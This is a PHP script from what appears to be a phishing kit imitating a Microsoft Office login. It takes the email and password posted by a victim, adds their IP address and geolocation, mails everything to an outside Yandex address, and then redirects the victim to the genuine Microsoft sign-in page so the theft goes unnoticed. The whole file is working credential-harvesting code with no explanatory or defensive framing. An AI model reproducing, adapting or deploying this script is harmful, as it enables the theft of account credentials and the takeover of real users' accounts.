<?php

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$email = $_POST['email'];
$password = $_POST['password'];
$ip = getenv("REMOTE_ADDR");
$subj = "‎OFFICE $ip ";
$msg .= "--------------------------------------------\n";
$msg .= "Email         : ".$_POST['email']."\n";
$msg .= "Password      : ".$_POST['password']."\n";
$msg .= "IP: ".$ip.      "\n";
$msg .= "City: {$geoplugin->city}\n";
$msg .= "Region: {$geoplugin->region}\n";
$msg .= "Country Name: {$geoplugin->countryName}\n";
$msg .= "Country Code: {$geoplugin->countryCode}\n";
$msg .= "Date: ".$adddate."\n";
$msg .= "--------------------------------------------\n";

if (($email==NULL)){

echo "<script>location.replace('OF.htm');</script>";
exit;
}

if (($password==NULL)){

echo "<script>location.replace('OF.htm');</script>";
exit;
}

else {

mail("robinsondreck@yandex.com", $subj, $msg);

echo "<script language=javascript>
alert('Connecting please wait');
window.location='https://login.microsoftonline.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=2&ct=1369803670&rver=6.1.6206.0&wp=MBI_KEY&wreply=https:%252F%252Fwww.outlook.com%252Fowa%252F&id=260563&whr=live.utm.my&CBCXT=out&bk=1369803951';
</script>";
    
}

?>